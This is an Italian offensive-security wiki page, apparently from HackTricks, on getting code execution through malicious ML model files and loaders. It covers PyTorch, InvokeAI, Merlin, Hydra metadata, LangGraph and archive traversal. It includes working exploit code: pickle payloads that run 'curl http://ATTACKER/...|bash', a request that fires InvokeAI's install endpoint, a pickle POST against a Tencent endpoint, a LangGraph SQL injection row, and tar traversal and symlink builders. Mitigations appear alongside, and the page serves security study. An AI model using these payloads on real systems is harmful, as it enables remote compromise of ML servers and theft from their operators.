# RCE dei modelli

{{#include ../banners/hacktricks-training.md}}

## Caricamento dei modelli per RCE

I modelli di Machine Learning vengono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati sulle macchine degli sviluppatori o nei sistemi di produzione per essere utilizzati. Solitamente i modelli non dovrebbero contenere codice malevolo, ma in alcuni casi il modello può essere utilizzato per eseguire codice arbitrario sul sistema, come funzionalità prevista oppure a causa di una vulnerabilità nella libreria di caricamento dei modelli.

Al momento della stesura, questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Il pickle malevolo nel checkpoint del modello porta all'esecuzione di codice (bypassando la protezione `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download di un modello malevolo causa l'esecuzione di codice; RCE tramite deserializzazione Java nell'API di gestione                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserializzazione non sicura del checkpoint tramite `torch.load` **(CVE-2025-23298)**                                           | Un checkpoint non attendibile attiva il reducer di pickle durante `load_model_trainer_states_from_checkpoint` → esecuzione di codice nel worker ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook di estensione MessagePack non sicuro **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La chiave `filter` controllata dall'utente inserisce sintassi SQL/JSON-path, `UNION SELECT` crea una riga di checkpoint falsa, quindi la deserializzazione `msgpack` importa e chiama codice Python scelto dall'attaccante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Il caricamento del modello da YAML utilizza `yaml.unsafe_load` (esecuzione di codice) <br> Il caricamento del modello con il layer **Lambda** esegue codice Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modello `.tflite` appositamente creato attiva un integer overflow → corruzione dell'heap (potenziale RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Il caricamento di un modello tramite `joblib.load` esegue pickle con il payload `__reduce__` dell'attaccante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Il valore predefinito di `numpy.load` consentiva array di oggetti pickle – un `.npy/.npz` malevolo attiva l'esecuzione di codice                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Il percorso degli external weights del modello ONNX può uscire dalla directory (lettura di file arbitrari) <br> Un tar di un modello ONNX malevolo può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modello con un custom operator richiede il caricamento di codice nativo dell'attaccante; grafi di modelli complessi abusano della logica per eseguire calcoli non intenzionali   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'utilizzo dell'API di caricamento dei modelli con `--model-control` abilitato consente il path traversal relativo per scrivere file (ad esempio, sovrascrivere `.bashrc` per ottenere RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un file di modello GGUF malformato causa heap buffer overflow nel parser, consentendo l'esecuzione di codice arbitrario sul sistema della vittima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modello HDF5 (`.h5`) malevolo con un layer Lambda continua a eseguire codice al caricamento (la safe_mode di Keras non copre il vecchio formato – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Molti tool ML (ad esempio, formati di modelli basati su pickle e `pickle.load` di Python) eseguono codice arbitrario incorporato nei file del modello, se non vengono applicate mitigazioni | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadati non attendibili passati a `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | I metadati/config del modello controllati dall'attaccante impostano `_target_` su una callable arbitraria (ad esempio, `builtins.exec`) → esecuzione durante il caricamento, anche con formati “safe” (`.safetensors`, `.nemo`, `config.json` del repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Inoltre, esistono alcuni modelli basati su python pickle, come quelli utilizzati da [PyTorch](https://github.com/pytorch/pytorch/security), che possono essere utilizzati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Pertanto, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella precedente.

### Metadati Hydra → RCE (funziona anche con safetensors)

`hydra.utils.instantiate()` importa e chiama qualsiasi `_target_` puntato tramite notazione dotted in un oggetto di configurazione/metadati. Quando le librerie passano **metadati del modello non attendibili** a `instantiate()`, un attaccante può fornire una callable e argomenti che vengono eseguiti immediatamente durante il caricamento del modello (non è richiesto pickle).<sup>[[12]](#references)[[13]](#references)</sup>

Esempio di payload (funziona in `model_config.yaml` di `.nemo`, `config.json` del repo o `__metadata__` all'interno di `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Punti chiave:
- Attivato prima dell'inizializzazione del modello in `restore_from/from_pretrained` di NeMo, nei coder HuggingFace di uni2TS e nei loader di FlexTok.
- La string block-list di Hydra può essere aggirata tramite percorsi di import alternativi (ad esempio, `enum.bltns.eval`) o nomi risolti dall'applicazione (ad esempio, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analizza inoltre i metadati rappresentati come stringhe con `ast.literal_eval`, consentendo un DoS (esaurimento di CPU/memoria) prima della chiamata a Hydra.

### 🆕  RCE di InvokeAI tramite `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install`, che consente agli utenti di scaricare e caricare modelli da URL arbitrari.<sup>[[1]](#references)</sup>

Internamente, l'endpoint alla fine chiama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` esegue una **deserializzazione pickle**. Poiché il contenuto proviene direttamente dall'URL controllato dall'utente, un attaccante può incorporare un oggetto malevolo con un metodo `__reduce__` personalizzato all'interno del checkpoint; il metodo viene eseguito **durante la deserializzazione**, portando alla **remote code execution (RCE)** sul server InvokeAI.

La vulnerabilità è stata assegnata a **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Procedura pratica di exploitation

1. Crea un checkpoint malevolo:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP sotto il tuo controllo (ad es. `http://ATTACKER/payload.ckpt`).
3. Attiva l’endpoint vulnerabile (non è richiesta autenticazione):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file, chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene l'esecuzione di codice nel contesto del processo InvokeAI.

Exploit già pronto: il modulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.<sup>[[3]](#references)</sup>

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (flag `scan` predefinito **false**)
•  `/api/v2/models/install` raggiungibile dall'attaccante
•  Il processo dispone delle autorizzazioni per eseguire comandi shell

#### Mitigazioni

* Eseguire l'upgrade a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` per impostazione predefinita ed esegue una scansione malware prima della deserializzazione.<sup>[[2]](#references)</sup>
* Quando si caricano checkpoint programmaticamente, usare `torch.load(file, weights_only=True)` o il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Applicare allow-list / firme per le sorgenti dei modelli ed eseguire il servizio con il principio del privilegio minimo.

> ⚠️ Ricorda che qualsiasi formato basato su Python pickle (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente non sicuro da deserializzare se proviene da sorgenti non attendibili.

---

Esempio di mitigazione ad hoc se devi mantenere in esecuzione versioni meno recenti di InvokeAI dietro un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE tramite `torch.load` non sicuro (CVE-2025-23298)

Transformers4Rec di NVIDIA (parte di Merlin) esponeva un checkpoint loader non sicuro che chiamava direttamente `torch.load()` sui percorsi forniti dall’utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato dall’attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.<sup>[[5]](#references)</sup>

Percorso vulnerabile (prima della correzione): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: in Python pickle, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che restituisce una callable e i relativi argomenti. La callable viene eseguita durante l’unpickling. Se un oggetto di questo tipo è presente in un checkpoint, viene eseguito prima dell’utilizzo dei pesi.

Esempio minimo di checkpoint malevolo:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vettori di distribuzione e raggio d'impatto:
- Checkpoint/modelli Trojanizzati condivisi tramite repository, bucket o artifact registry
- Pipeline automatizzate di resume/deploy che caricano automaticamente i checkpoint
- L'esecuzione avviene all'interno dei worker di training/inference, spesso con privilegi elevati (ad esempio, root nei container)

Fix: il commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito la chiamata diretta a `torch.load()` con un deserializer limitato e basato su una allowlist, implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader convalida tipi/campi e impedisce l'invocazione di callable arbitrari durante il caricamento.<sup>[[7]](#references)</sup>

Indicazioni difensive specifiche per i checkpoint PyTorch:
- Non fare unpickle di dati non attendibili. Preferire, quando possibile, formati non eseguibili come [Safetensors](https://huggingface.co/docs/safetensors/index) o ONNX.
- Se è necessario usare la serializzazione PyTorch, assicurarsi che `weights_only=True` sia attivo (supportato nelle versioni più recenti di PyTorch) oppure usare un unpickler personalizzato basato su una allowlist, simile alla patch di Transformers4Rec.<sup>[[4]](#references)</sup>
- Applicare la verifica della provenienza/firma dei modelli e mettere in sandbox la deserializzazione (seccomp/AppArmor; utente non-root; filesystem con accesso limitato e nessun egress di rete).
- Monitorare la presenza di processi child imprevisti nei servizi ML al momento del caricamento dei checkpoint; tracciare l'uso di `torch.load()`/`pickle`.

Riferimenti a POC e versioni vulnerabili/patchate:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Loader vulnerabile prima della patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC di checkpoint malevolo: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader dopo la patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Esempio – creazione di un modello PyTorch malevolo

- Creare il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserializzazione Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD di Tencent espone un endpoint `resnet` che deserializza dati controllati dall’utente. ZDI ha confermato che un attaccante remoto può indurre una vittima a caricare una pagina/file malevolo, farle inviare un serialized blob appositamente creato a quell’endpoint e attivare la deserializzazione come `root`, causando una compromissione completa.

Il flusso dell’exploit rispecchia il tipico abuso di pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualsiasi gadget raggiungibile durante la deserializzazione (costruttori, `__setstate__`, callback del framework, ecc.) può essere weaponized nello stesso modo, indipendentemente dal fatto che il transport sia HTTP, WebSocket o un file inserito in una directory monitorata.



### LangGraph checkpointer SQLi → MessagePack RCE

Questa attack chain è interessante perché l'attaccante **non deve caricare un file di modello malevolo**. Al contrario, l'applicazione espone una **API di persistenza dell'AI-agent** (`get_state_history(..., filter=...)`) e l'input dell'utente raggiunge il query builder del checkpointer.

#### 1. SQLi strutturale nei metadata filter

Un pattern SQLite vulnerabile era simile a:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Il valore viene associato in seguito, ma `query_key` viene concatenato nella **stringa del percorso JSON**, quindi un `'` all'interno della chiave del dizionario esce da `'$.{query_key}'` e inietta SQL. La stessa lezione si applica a **JSON paths, identificatori, operatori, `LIMIT` e campi TTL**: i placeholder proteggono solo i valori, non la sintassi strutturale della query.

#### 2. `UNION SELECT` può puntare a downstream sinks, non solo al furto di dati

La query restituisce `type` e i byte `checkpoint` serializzati, che vengono successivamente consumati come:
```python
self.serde.loads_typed((type, checkpoint))
```
Ciò significa che una SQLi nella clausola `WHERE` può iniettare una **riga di risultato falsa**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Se in seguito il codice analizza, deserializza, scrive o esegue una qualsiasi colonna selezionata, associa quelle colonne ai rispettivi sink. In questo caso, la riga falsa trasforma SQLi in **deserializzazione controllata dall'attaccante**.

#### 3. Gli unsafe MessagePack extension hooks sono equivalenti a code gadgets

Il percorso `msgpack` di LangGraph utilizzava un custom extension hook che estraeva una tupla annidata ed eseguiva:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Quindi, un oggetto di estensione MessagePack che codifica qualcosa di equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, risolve `system` ed esegue il comando. Durante la revisione degli AI framework, esamina i **custom MessagePack/JSON/pickle revivers** alla ricerca di import dinamici, reflection o dispatch arbitrario di callable.

#### 4. Pattern pratico di audit per gli agent framework

Esamina qualsiasi input controllato dall'utente che raggiunga:
- API di state history / memory / replay / checkpoint listing
- structured filter builder che generano frammenti di query SQL o Redis
- custom deserializer (`pickle`, `msgpack`, hook per oggetti `json`, costruttori YAML)
- percorsi di recovery che si fidano delle righe restituite dal persistence layer

Questa specifica catena ha interessato deployment self-hosted di LangGraph che utilizzavano checkpointer **SQLite** o **Redis**, quando utenti non attendibili potevano controllare `filter`. Le versioni patched indicate nella disclosure erano `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` e `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modelli per Path Traversal

Come commentato in [**questo blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati dei modelli utilizzati dai diversi AI framework si basa su archivi, generalmente `.zip`. Pertanto, potrebbe essere possibile abusare di questi formati per eseguire attacchi di path traversal, consentendo di leggere file arbitrari dal sistema in cui il modello viene caricato.<sup>[[16]](#references)</sup>

Ad esempio, con il seguente codice puoi creare un modello che creerà un file nella directory `/tmp` quando viene caricato:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il seguente codice puoi creare un modello che creerà un symlink alla directory `/tmp` al momento del caricamento:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondimento: deserializzazione di Keras .keras e ricerca di gadget

Per una guida mirata agli interni di .keras, alla RCE tramite Lambda-layer, al problema degli import arbitrari nelle versioni ≤ 3.8 e alla ricerca di gadget dopo la correzione all'interno della allowlist, consulta:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Riferimenti

- [1] [Blog OffSec – "CVE-2024-12029 – Deserializzazione di dati non attendibili in InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit della patch di InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentazione del modulo Metasploit di Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considerazioni sulla sicurezza per torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: ottenere l'esecuzione di codice da remoto in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Avviso ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit della patch di Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader vulnerabile pre-patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC di checkpoint malevolo (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader post-patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers di Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Esecuzione di codice da remoto con formati e librerie moderne di AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentazione di Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit della block-list di Hydra (avviso sulla RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Da SQLi a RCE: sfruttare il Checkpointer di LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Trasformare i bug Archive Slip in bounty di alto valore nell'ambito AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
